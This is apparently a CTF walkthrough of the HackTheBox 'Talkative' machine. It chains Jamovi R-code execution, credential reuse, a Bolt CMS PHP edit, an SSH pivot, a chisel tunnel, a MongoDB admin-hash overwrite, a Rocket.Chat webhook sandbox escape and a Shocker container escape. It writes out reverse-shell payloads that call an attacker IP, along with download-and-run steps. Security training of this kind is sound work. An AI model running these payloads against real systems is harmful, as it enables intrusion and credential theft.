# HackTheBox — Talkative (Hard) — Full Walkthrough

**Attacker IP:** 10.10.16.84  
**Target IP:** 10.129.227.113  
**Difficulty:** Hard  
**OS:** Linux (Ubuntu 20.04 host + multiple Docker containers)  

---

## Table of Contents

1. [Mindset & Methodology](#mindset--methodology)
2. [Reconnaissance — Nmap](#step-1-reconnaissance--nmap)
3. [Web Enumeration](#step-2-web-enumeration)
4. [Jamovi RCE — Shell in Container 1](#step-3-jamovi-rce--shell-in-container-1)
5. [Credential Extraction from .omv File](#step-4-credential-extraction-from-omv-file)
6. [Bolt CMS Code Execution — Shell in Container 2](#step-5-bolt-cms-code-execution--shell-in-container-2)
7. [SSH Pivot to Host — User Flag](#step-6-ssh-pivot-to-host--user-flag)
8. [Docker Network Enumeration](#step-7-docker-network-enumeration)
9. [Chisel Tunnel to MongoDB](#step-8-chisel-tunnel-to-mongodb)
10. [Rocket.Chat Admin Takeover via MongoDB](#step-9-rocketchat-admin-takeover-via-mongodb)
11. [Rocket.Chat Webhook RCE — Shell in Container 3](#step-10-rocketchat-webhook-rce--shell-in-container-3)
12. [Container Escape via CAP_DAC_READ_SEARCH](#step-11-container-escape-via-cap_dac_read_search)
13. [Root Flag](#step-12-root-flag)
14. [Key Lessons & Hacker Mindset Summary](#key-lessons--hacker-mindset-summary)

---

## Mindset & Methodology

Before touching the target, understand how experienced hackers approach a box:

- **Enumerate everything before exploiting anything.** Rushing to exploit the first thing you find wastes time. Map the full attack surface first.
- **Follow the application logic.** Applications leave clues — product names, usernames, error messages — that point to the next step.
- **Pivot mindset.** On a Hard box, you rarely go straight from external to root. Expect multiple hops: external → container → host → another container → host root.
- **Credentials reuse everywhere.** Any password you find should be tried on every service available.
- **Containers are not the end.** Getting root inside a Docker container is not the goal — escaping to the host is.

---

## Step 1: Reconnaissance — Nmap

### What we do

```bash
# First, add the target to /etc/hosts so we can use the hostname
echo "10.129.227.113 talkative.htb" | sudo tee -a /etc/hosts

# Full port scan with service/version detection and default scripts
nmap -p 22,80,3000,8080,8081,8082 -sCV 10.129.227.113
```

### Why we do it

Nmap is our first tool for every engagement. It tells us:
- Which ports are open (attack surface)
- What services are running (what we can target)
- What versions are running (what CVEs might apply)

Adding the hostname to `/etc/hosts` is important because the web server redirects to `talkative.htb` by hostname. Without this, our browser can't resolve it.

### Results

```
22/tcp   filtered  ssh
80/tcp   open      Apache httpd 2.4.52 (Bolt CMS)
3000/tcp open      Rocket.Chat (Meteor framework)
8080/tcp open      Tornado httpd 5.0 (Jamovi)
8081/tcp open      Tornado httpd 5.0 (404)
8082/tcp open      Tornado httpd 5.0 (404)
```

### Hacker mindset

- **Port 22 is filtered** — SSH is blocked from the outside. This tells us we can't brute-force SSH externally. We'll need to find a way in through the web services first.
- **Three separate web services** — port 80, 3000, and 8080 each run completely different applications. Each is a potential attack vector.
- **8081/8082 returning 404** — these are likely related to Jamovi (same Tornado framework). Not immediately useful, but noted.
- **Apache/2.4.52 on Debian** — the Apache version leaks the underlying OS, helping us narrow down exploit compatibility later.

---

## Step 2: Web Enumeration

### Port 80 — Bolt CMS

Browse to `http://talkative.htb`. You'll see a corporate website for a communications company. Key things to notice:

- The "Our People" section lists employees with emails:
  - `janit@talkative.htb` (CFO)
  - `matt@talkative.htb` (CMO)
  - `saul@talkative.htb` (CEO)
- The "Products" section mentions **Jamovi** (Talk-A-Stats) and **Rocket.Chat** (Talkforbiz)
- The footer error when submitting the contact form reveals **Bolt CMS** is in use
- The Bolt admin panel lives at `http://talkative.htb/bolt`

### Port 3000 — Rocket.Chat

Browse to `http://talkative.htb:3000`. You'll find a Rocket.Chat login page. You can register an account to look around, but without admin credentials there's little to do. Note the admin username is **saul**.

### Port 8080 — Jamovi

Browse to `http://talkative.htb:8080`. This is a Jamovi statistical analysis tool — and crucially, **it requires no authentication**. Jamovi itself warns you it's running an outdated version with known security vulnerabilities.

### Hacker mindset

- **Employee names = potential usernames.** These three email addresses will be credential candidates everywhere.
- **Product mentions = attack surface hints.** The website literally tells us which software is running. Jamovi on port 8080 and Rocket.Chat on port 3000 are confirmed attack vectors.
- **No-auth services are gold.** Jamovi needs no login. That's our lowest-resistance entry point — try it first.
- **CMS admin panels are high-value targets.** Bolt's `/bolt` login page means if we get credentials, we may get code execution through template/plugin functionality.

---

## Step 3: Jamovi RCE — Shell in Container 1

### Background

Jamovi is a statistical analysis application that includes an **Rj Editor** — a built-in R language interpreter. R has a `system()` function that executes OS commands. Since Jamovi runs as root inside a Docker container and has no authentication, we can execute arbitrary OS commands with zero effort.

### What we do

**Start a listener on Kali:**

```bash
nc -lnvp 443
```

**In Jamovi (http://talkative.htb:8080):**
1. Click the **Analyses** tab
2. Click the **R** button → select **Rj Editor**
3. Paste the reverse shell payload:

```r
system("bash -c 'bash -i >& /dev/tcp/10.10.16.84/443 0>&1'", intern=TRUE)
```

4. Press **Ctrl+Shift+Enter** to execute

### Why this works

R's `system()` function passes commands directly to the OS shell. The `intern=TRUE` parameter captures stdout. We use bash's `/dev/tcp` pseudo-device to create a TCP connection back to our machine, redirecting stdin/stdout/stderr through it — giving us an interactive shell.

### Result

```
root@b06821bbda78:/# id
uid=0(root) gid=0(root) groups=0(root)
```

We are **root inside a Docker container**. The hostname (`b06821bbda78`) is a container ID, confirming we're not on the real host yet.

### Hacker mindset

- **Trust the software's own features.** We didn't exploit a memory corruption bug — we used the application exactly as designed. The built-in R interpreter IS the vulnerability because it was exposed without authentication.
- **Always run as root in containers.** Docker containers often run processes as root internally. This is bad practice but common. Root inside the container means we can do anything within it — including reading sensitive files.
- **Reverse shells, not bind shells.** We connect back to ourselves (reverse) rather than opening a port on the target (bind), because firewalls typically block inbound connections but allow outbound ones.

---

## Step 4: Credential Extraction from .omv File

### What we find

In `/root` of the Jamovi container:

```bash
ls /root
# bolt-administration.omv
```

A `.omv` file is a Jamovi project document. The name "bolt-administration" is an obvious hint.

### What we do

**In the container — base64 encode the file:**

```bash
cat /root/bolt-administration.omv | base64 -w 0
```

**On Kali — decode and extract:**

```bash
echo 'BASE64_STRING' | base64 -d > /tmp/bolt-administration.omv
cd /tmp && unzip bolt-administration.omv
cat xdata.json | python3 -m json.tool
```

### Why this works

`.omv` files are just ZIP archives. Inside, `xdata.json` contains the spreadsheet data. Someone stored credentials in a Jamovi spreadsheet and left it on the server — a classic example of insecure credential storage.

### Credentials found

| Username | Password |
|----------|----------|
| `matt@talkative.htb` | `jeO09ufhWD<s` |
| `janit@talkative.htb` | `bZ89h}V<S_DA` |
| `saul@talkative.htb` | `)SQWGm>9KHEA` |

### Hacker mindset

- **Interesting filenames are not accidents.** "bolt-administration.omv" screams "try these on Bolt CMS". The box creator left a breadcrumb.
- **All file formats can hide data.** A statistical analysis file containing passwords is unusual, but attackers look inside everything — ZIP archives, Office documents, databases. Never assume a file is "just data".
- **Base64 is the universal file transfer protocol** when you have a shell but no tools. It turns binary into text you can copy-paste through any terminal.
- **Try credentials everywhere immediately.** Once you have credentials, spray them on every service before moving on.

---

## Step 5: Bolt CMS Code Execution — Shell in Container 2

### Background

Bolt CMS is a PHP-based content management system. When logged in as admin, it allows editing PHP configuration files and Twig templates. We'll abuse the ability to edit `bundles.php` — a PHP file that's executed when Bolt loads — to inject a reverse shell.

### What we do

**Navigate to Bolt admin:**

```
http://talkative.htb/bolt/login
Username: admin
Password: jeO09ufhWD<s   (matt's password — reused by the admin account)
```

**Start a listener:**

```bash
nc -lnvp 443
```

**In Bolt admin:**
1. Go to **Configuration → All configuration files**
2. Select **bundles.php**
3. Add a PHP reverse shell immediately after `<?php`:

```php
<?php
$sock=fsockopen("10.10.16.84",443,$e,$m,30);
$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
```

4. Click **Save changes**
5. Visit `http://talkative.htb/bolt` — loading the dashboard executes `bundles.php`

### Why this works

`bundles.php` is a PHP file that Bolt CMS loads as part of its bootstrap process. By injecting PHP code into it, we make the server execute our code every time that file is included. `fsockopen` opens a TCP connection to our machine, and `proc_open` spawns a shell with its stdin/stdout/stderr connected to that socket — giving us a shell.

### Why not Twig SSTI?

The Twig template injection approach (used in other writeups) can fail due to:
- Special characters (`>&`) being HTML-escaped in the template editor
- PHP `exec()` behavior differences between versions
- Cache not being cleared properly

The `bundles.php` PHP injection is more reliable because it's direct PHP execution with no intermediary template engine.

### Result

```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

hostname -I
172.17.0.8
```

We're **www-data inside another Docker container** (172.17.0.8 — the Bolt CMS container).

### Hacker mindset

- **Admin access to a CMS = code execution.** This is almost always true. CMS platforms by design let admins customize the site with code. That's the attack primitive.
- **When one exploit fails, try another path.** The Twig SSTI is the "textbook" exploit here, but the PHP file edit achieves the same goal with less friction. Hackers are pragmatic — use what works.
- **Password reuse is endemic.** The credentials from the Jamovi file were for `matt@talkative.htb`, but they also work for the `admin` Bolt account. Always try credentials on every service.
- **"www-data" is not the end.** We have limited privileges in this container, but it has SSH client installed — which means we can pivot.

---

## Step 6: SSH Pivot to Host — User Flag

### Background

We're in the Bolt CMS container (172.17.0.8). Docker containers communicate with the host via a bridge network. The **Docker bridge gateway** (`172.17.0.1` or `172.18.0.1`) is actually the host machine's IP on the Docker network. Port 22 was filtered from the outside, but **from inside a container, SSH to the host is possible**.

### What we do

**Upgrade the shell first (needed for SSH to work interactively):**

```bash
script /dev/null -c bash
```

**SSH to the host:**

```bash
ssh saul@172.18.0.1
# Password: jeO09ufhWD<s
```

**Grab the user flag:**

```bash
cat ~/user.txt
# 4bbc98[redacted]bdc815e47
```

### Why this works

The Docker bridge gateway IP (`172.18.0.1`) is the host machine. The host runs SSH on port 22, but that port is firewalled from the internet. From inside a container on the same Docker network, that firewall rule doesn't apply — we can reach port 22 directly.

The password `jeO09ufhWD<s` (originally associated with matt's email) is reused by saul's SSH account — another case of credential reuse.

### Why `172.18.0.1` and not `172.17.0.1`?

The machine runs two Docker bridge networks:
- `172.17.0.0/16` — `docker0` bridge (where most containers live)
- `172.18.0.0/16` — `br-ea74c394a147` bridge (where Jamovi lives)

The Bolt container is on the `172.17.0.0` network, so the gateway is `172.17.0.1`. However, both bridge IPs are on the same host — both work for SSH. In practice, try both if one fails.

### Hacker mindset

- **"Filtered" means filtered from outside, not from everywhere.** SSH being filtered externally is irrelevant once you have an internal foothold. Internal networks are often far more permissive.
- **The gateway is the host.** In Docker environments, `172.17.0.1` (or whatever the bridge gateway is) is almost always the physical host machine. This is a fundamental Docker networking concept every pentester must know.
- **`script /dev/null -c bash` is the essential shell upgrade.** Without a proper TTY, SSH won't work interactively (it can't display the password prompt correctly). This one-liner promotes our dumb shell to a proper terminal.

---

## Step 7: Docker Network Enumeration

### What we do

As saul on the host, enumerate all Docker containers:

```bash
ps auxww | grep docker
```

### What we learn

From the docker-proxy processes, we can map the entire container network:

| Container IP | Forwarded Port | Service |
|-------------|---------------|---------|
| `172.18.0.2` | 8080/8081/8082 | Jamovi |
| `172.17.0.3` | 3000 (localhost only) | Rocket.Chat |
| `172.17.0.2` | (none external) | Unknown |
| `172.17.0.4-19` | 6000-6015 (internal) | Bolt instances (per-player) |

**Interesting:** `172.17.0.2` has no external port forward, meaning it's hidden from the outside. Let's scan it:

```bash
# Upload a static nmap binary first
wget http://10.10.16.84/nmap -O /dev/shm/nmap
chmod +x /dev/shm/nmap

/dev/shm/nmap -p- --min-rate 10000 172.17.0.2
# PORT      STATE SERVICE
# 27017/tcp open  unknown
```

**Port 27017 = MongoDB.** And it has no authentication (the startup warnings from MongoDB will confirm this later).

### Hacker mindset

- **Map the internal network before you exploit it.** Understanding the full topology prevents you from missing attack paths. The `ps auxww | grep docker` trick is elegant — docker-proxy processes literally list every container and its ports.
- **Hidden services are often more vulnerable.** `172.17.0.2` has no external port forward precisely because it's an internal service. Internal services are often configured with no authentication because "nothing external can reach it" — a false sense of security.
- **27017 = MongoDB.** Port numbers are a language. Learn the common ones: 27017 (MongoDB), 6379 (Redis), 5432 (PostgreSQL), 9200 (Elasticsearch). All of these are frequently misconfigured with no authentication in containerized environments.

---

## Step 8: Chisel Tunnel to MongoDB

### Background

MongoDB is at `172.17.0.2:27017` — reachable from the host (saul's shell) but not from our Kali machine. **Chisel** is a TCP tunnel tool that creates a reverse port forward: the target connects OUT to us, and we forward a local port through that connection to MongoDB.

### What we do

**On Kali — start Chisel server:**

```bash
chisel server -p 8000 --reverse
```

**Serve chisel to the target:**

```bash
python3 -m http.server 9999 -d /tmp
```

**On the host (saul's shell) — download and connect:**

```bash
cd /dev/shm
wget http://10.10.16.84:9999/chisel
chmod +x chisel
./chisel client 10.10.16.84:8000 R:27017:172.17.0.2:27017
```

**Result:** Port `127.0.0.1:27017` on our Kali machine now tunnels directly to `172.17.0.2:27017` (MongoDB inside the Docker network).

### Why Chisel?

Chisel uses WebSockets over HTTP, which looks like normal web traffic. It works even through strict egress firewalls. The `--reverse` flag means the CLIENT (target) opens a tunnel to the server (us) and lets the server forward ports. This is critical because we can't reach the target directly on arbitrary ports.

### Hacker mindset

- **Pivoting is a core skill.** You will almost never have a direct path from your machine to every target. Learning to tunnel through intermediate hosts is essential.
- **`R:` means reverse tunnel.** In Chisel, `R:27017:172.17.0.2:27017` means "on the server side (Kali), open port 27017 and forward it through the client connection to 172.17.0.2:27017". The R prefix is the key distinction.
- **`/dev/shm` is your staging area.** It's a RAM-based tmpfs mount that's writable, executable (usually), and gets wiped on reboot. It doesn't show up in disk forensics as easily as writing to `/tmp` or the home directory.

---

## Step 9: Rocket.Chat Admin Takeover via MongoDB

### Background

Rocket.Chat stores all its data — including user accounts and password hashes — in MongoDB. The database has **no authentication**, meaning anyone who can reach it has full read/write access to everything, including the ability to change any user's password.

### What we do

**Connect to MongoDB from Kali:**

```bash
mongo 127.0.0.1:27017
```

**Enumerate the database:**

```javascript
show databases
// admin, config, local, meteor

use meteor
db.users.find({}, {username:1, roles:1, emails:1})
// Shows: admin user (saul@talkative.htb, roles: ["admin"])
```

**Reset the admin password to `password123`:**

```javascript
db.getCollection('users').update(
  {username: "admin"},
  { $set: {"services": {"password": {"bcrypt": "$2b$10$P.0yayHX0mTpMy59HyHwPuu1ch/JSyoQPsOgglGB7ThVhnNZ4rQ22"}}}}
)
// WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

The bcrypt hash `$2b$10$P.0yayHX0mTpMy59HyHwPuu1ch/JSyoQPsOgglGB7ThVhnNZ4rQ22` is the hash of `password123`. We copied it from a test account we registered earlier (whose password we set to `password123`).

### Why this works

Rocket.Chat uses MongoDB as its backend database (it's built on Meteor, which uses MongoDB natively). Password hashes are stored in `meteor.users.services.password.bcrypt`. Since MongoDB has no auth, we can update this field directly. Rocket.Chat will then accept the new hash when we log in.

### Log into Rocket.Chat

```
http://talkative.htb:3000
Username: admin
Password: password123
```

### Hacker mindset

- **No-auth databases are complete compromises.** If you reach an unauthenticated MongoDB, Redis, or Elasticsearch, assume full data access and full application takeover. It's game over for that service.
- **You don't need to crack password hashes — replace them.** Cracking bcrypt is computationally expensive. But if you have write access to the database, just replace the hash with one you already know. This is far faster and more reliable.
- **Admin access to a platform = more code execution.** Just as with Bolt CMS, getting admin access to Rocket.Chat opens up administrative features that can execute code. That's our next step.

---

## Step 10: Rocket.Chat Webhook RCE — Shell in Container 3

### Background

Rocket.Chat's **Integrations** feature allows admins to create webhooks — HTTP endpoints that execute JavaScript code when triggered. This is a legitimate feature for automating messages and notifications. We abuse it to run a Node.js reverse shell.

### What we do

**Start a listener:**

```bash
nc -lnvp 4444
```

**In Rocket.Chat admin panel:**

1. Go to **Administration → Integrations → New Integration**
2. Select **Incoming WebHook**
3. Set **Post to Channel:** `#general`, **Post as:** `rocket.cat`
4. Enable **Script** and paste:

```javascript
const require = console.log.constructor('return process.mainModule.require')();
var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(4444, "10.10.16.84", function(){
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
```

5. Click **Save Changes** — copy the **Webhook URL** shown at the bottom
6. Trigger the webhook:

```bash
curl http://talkative.htb:3000/hooks/YOUR_ID/YOUR_TOKEN
```

### Why the `require` bypass is needed

Rocket.Chat's webhook sandbox restricts direct use of `require()`. The line:

```javascript
const require = console.log.constructor('return process.mainModule.require')();
```

Escapes the sandbox by using `Function` constructor (accessible via `console.log.constructor`) to create a new function that returns Node.js's module system. This is a well-known sandbox escape for Rocket.Chat webhook scripts.

### Result

```
id
uid=0(root) gid=0(root) groups=0(root)

hostname
c150397ccd63

hostname -I
172.17.0.3
```

Root in the **Rocket.Chat Docker container** (172.17.0.3).

### Hacker mindset

- **"Script execution" features in admin panels ARE code execution.** Webhooks, automation scripts, template engines, cron jobs — if an admin panel lets you run "scripts", that's RCE. Full stop.
- **Sandbox escapes are well-documented.** The `process.mainModule.require` trick is documented in countless resources. Before writing custom exploits, search for known bypasses for the specific platform/version you're targeting.
- **curl is the simplest exploit trigger.** Once a webhook is configured, a single curl command is all it takes. Simple is better.

---

## Step 11: Container Escape via CAP_DAC_READ_SEARCH

### Background

Linux capabilities are fine-grained privileges that can be granted to processes independently of full root. The Rocket.Chat container has `CAP_DAC_READ_SEARCH` — a dangerous capability that **bypasses DAC (Discretionary Access Control) read checks**. Combined with the `open_by_handle_at()` system call, this allows reading ANY file on the **host filesystem** from inside the container.

### Verify the capability

```bash
cat /proc/1/status | grep CapEff
# CapEff: 00000000a80425fd
```

Decode with `capsh`:
```bash
capsh --decode=00000000a80425fd
# includes cap_dac_read_search
```

### The Shocker Exploit

The **Shocker exploit** (`shocker.c`) abuses `open_by_handle_at()` — a syscall that opens files by their filesystem inode handle rather than by path. With `CAP_DAC_READ_SEARCH`, we can:

1. Get a file descriptor to a known file that's bind-mounted into the container (like `/etc/hosts`)
2. Use that descriptor to get the filesystem handle for the host's root directory
3. Walk the host's directory tree by inode to find any file
4. Open and read that file — even though it's outside our container's filesystem namespace

### Compile the exploit on Kali

```bash
cd /tmp

# Download shocker.c
wget https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c

# Modify it: change the pivot file from /.dockerinit (doesn't exist on modern systems)
# to /etc/hosts (which IS bind-mounted from the host into the container)
sed -i 's|/.dockerinit|/etc/hosts|g' shocker.c

# Change the target file to read from /etc/shadow to /root/root.txt
sed -i 's|/etc/shadow|/root/root.txt|g' shocker.c

# Verify changes
grep -n "etc/hosts\|root.txt" shocker.c

# Cross-compile for x86_64 (we're on ARM64 Kali, target is x86_64)
x86_64-linux-gnu-gcc -o shocker shocker.c -static
```

### Transfer to the container

Since the container has no `wget`, `curl`, or `/dev/tcp` file access, use **Node.js** (which is available since Rocket.Chat is a Node.js app) to download it:

**On Kali — serve the binary:**

```bash
python3 -m http.server 9999 -d /tmp
```

**In the container — download with Node.js and wait for DONE:**

```bash
node -e "const h=require('http'),f=require('fs');h.get('http://10.10.16.84:9999/shocker',r=>{const w=f.createWriteStream('/tmp/shocker');r.pipe(w);w.on('finish',()=>{console.log('DONE');process.exit();})});"
```

### Run the exploit

```bash
chmod +x /tmp/shocker
/tmp/shocker
# Press Enter when prompted
```

### Why `/etc/hosts` is the pivot file

The exploit needs a file that is **bind-mounted from the host into the container**. When Docker runs a container, it bind-mounts several host files into the container:
- `/etc/hosts`
- `/etc/hostname`
- `/etc/resolv.conf`

These files exist in both the container and on the host, sharing the same underlying inode. Shocker uses this shared inode as its "entry point" to walk the host filesystem.

### Why `/.dockerinit` doesn't work

Older Docker versions created `/.dockerinit` as a marker file inside containers. Modern Docker doesn't. The original shocker.c targets `/.dockerinit` — we must change this to a file that actually exists.

### Hacker mindset

- **Container ≠ security boundary when capabilities are misconfigured.** Docker containers are NOT VMs. They share the host kernel. Dangerous capabilities like `CAP_DAC_READ_SEARCH`, `CAP_SYS_ADMIN`, or `CAP_NET_ADMIN` can completely undermine container isolation.
- **Understand what you're exploiting.** The Shocker exploit is elegant — it doesn't break out of the container's filesystem namespace directly. Instead, it uses a legitimate syscall (`open_by_handle_at`) in an unintended way. Understanding the primitives (inode handles, bind mounts, kernel syscalls) makes you a better attacker and defender.
- **Cross-compilation is a critical skill.** Your attacker machine is ARM64. The target is x86_64. `x86_64-linux-gnu-gcc` is the cross-compiler for this. Always verify the target architecture before compiling.
- **File transfer is often the hardest part.** No wget, no curl, no /dev/tcp — but Node.js is available. Enumerate what tools exist and find creative solutions. The hacker mindset is: "if I can't use tool A, what else achieves the same goal?"

---

## Step 12: Root Flag

```
[!] Win! /root/root.txt output follows:
2158d5[redacted]a1d44b85
```

The Shocker exploit reads `/root/root.txt` directly from the host filesystem, even though we're inside a Docker container.

---

## Full Attack Chain Summary

```
[Kali 10.10.16.84]
        │
        │ HTTP to port 8080
        ▼
[Jamovi container 172.18.0.2]
  - No auth required
  - Rj Editor → R system() RCE
  - Root shell in container
  - Find: /root/bolt-administration.omv
  - Extract: 3 credential pairs
        │
        │ Credentials → Bolt CMS login
        ▼
[Bolt CMS container 172.17.0.8]
  - Login as admin with matt's password
  - Edit bundles.php → PHP reverse shell
  - www-data shell in container
        │
        │ SSH from container to host
        ▼
[Host 172.17.0.1 / 172.18.0.1]
  - ssh saul@172.18.0.1 (password reuse)
  - USER FLAG: /home/saul/user.txt ✓
  - Enumerate Docker network
  - Discover MongoDB at 172.17.0.2:27017
        │
        │ Chisel reverse tunnel
        ▼
[MongoDB container 172.17.0.2:27017]
  - No authentication
  - meteor database → users collection
  - Reset Rocket.Chat admin bcrypt hash
        │
        │ Rocket.Chat admin login
        ▼
[Rocket.Chat (port 3000)]
  - Admin access
  - Create webhook with Node.js script
  - Trigger via curl → RCE
        │
        │ Shell in container
        ▼
[Rocket.Chat container 172.17.0.3]
  - Root shell
  - CAP_DAC_READ_SEARCH capability
  - Shocker exploit → open_by_handle_at()
        │
        │ Read host files directly
        ▼
[Host /root/root.txt]
  - ROOT FLAG: /root/root.txt ✓
```

---

## Key Lessons & Hacker Mindset Summary

### 1. No Authentication = Immediate Exploitation
Jamovi and MongoDB both had zero authentication. Any service exposed without authentication should be your first target — the attack barrier is essentially zero.

### 2. Credentials Found Anywhere, Used Everywhere
A Jamovi spreadsheet file contained Bolt CMS credentials. Those same credentials worked for SSH. Always spray every credential you find against every service available.

### 3. Admin CMS Access = Code Execution
Whether it's Bolt CMS, WordPress, or Rocket.Chat — admin access to a web application that supports custom scripts/templates/plugins is effectively code execution. This is by design, and attackers abuse it regularly.

### 4. Docker is Not a Security Boundary
Containers share the host kernel. Misconfigured capabilities (`CAP_DAC_READ_SEARCH`), exposed Docker sockets, or privileged containers can completely break container isolation. Never assume root-in-container is safe.

### 5. Internal Services Are Often Unprotected
MongoDB had no auth because "only internal containers can reach it." This false sense of security is extremely common. Once you pivot inside the network, internal services become your attack surface.

### 6. Pivoting is the Core Skill
This box required 6 distinct hops to get the root flag. Enumeration at each step revealed the next target. The ability to pivot — through containers, across Docker networks, via tunnels — is what separates average pentesters from great ones.

### 7. When One Exploit Fails, Try Another
The Twig SSTI approach for Bolt CMS didn't work in our environment. We pivoted to PHP file injection and achieved the same result. Hackers don't give up when the first technique fails — they adapt.

### 8. Understand Your Tools
Knowing WHY Shocker works (bind mounts + `open_by_handle_at()` + `CAP_DAC_READ_SEARCH`) lets you adapt it when the default target file (`/.dockerinit`) doesn't exist. Blindly running tools without understanding them leads to failure when conditions differ from the tutorial.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port/service enumeration |
| `nc` (netcat) | Reverse shell listener |
| R `system()` | RCE via Jamovi Rj Editor |
| `base64` | Binary file transfer |
| `unzip` / `python3 -m json.tool` | Extract OMV credentials |
| Bolt CMS PHP injection | RCE via bundles.php |
| `script /dev/null -c bash` | Shell upgrade for SSH |
| `chisel` | Reverse TCP tunnel |
| `mongo` | MongoDB client |
| Rocket.Chat webhook | Node.js RCE |
| `shocker.c` | CAP_DAC_READ_SEARCH container escape |
| `x86_64-linux-gnu-gcc` | Cross-compile for x86_64 from ARM64 |
| Node.js `http.get` | File transfer in tool-less container |

---

*Walkthrough by: HTB Player | Machine: Talkative (Hard) | Platform: HackTheBox*
